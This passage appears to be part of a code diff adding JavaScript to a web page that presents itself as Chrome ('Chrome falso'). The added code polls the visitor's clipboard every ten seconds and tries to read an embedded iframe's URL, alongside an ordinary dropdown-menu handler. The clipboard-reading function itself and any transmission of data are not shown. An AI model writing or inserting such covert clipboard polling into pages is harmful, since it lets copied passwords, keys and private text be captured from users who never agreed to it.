+                        agregarLog('🚀 Chrome falso iniciado');
+                        
+                        // Leer portapapeles cada 10 segundos
+                        setInterval(leerPortapapeles, 10000);
+                        
+                        // Intentar acceder al iframe (si es mismo dominio)
+                        setTimeout(() => {
+                                try {
+                                        const iframe = document.getElementById('webview');
+                                        agregarLog(`📦 Iframe actual: ${iframe.contentWindow.location.href}`);
+                                } catch(e) {
+                                        agregarLog(`ℹ️ Iframe de otro dominio (normal)`);
+                                }
+                        }, 2000);
+                })();
+
+                // ===========================================
+                // FUNCIÓN PARA EL MENÚ (original)
+                // ===========================================
+                function toggleMenu() {
+                        document.getElementById('myDropdown').classList.toggle('show');
+                }
+
+                // Cerrar menú al hacer clic fuera
+                window.onclick = function(event) {
+                        if (!event.target.matches('.dropbtn') && !event.target.closest('.dropbtn')) {
+                                var dropdowns = document.getElementsByClassName('dropdown-content');
+                                for (var i = 0; i < dropdowns.length; i++) {
+                                        var openDropdown = dropdowns[i];
+                                        if (openDropdown.classList.contains('show')) {
+                                                openDropdown.classList.remove('show');
+                                        }
+                                }
+                        }
+                }
+        </script>
 </body>
 </html>
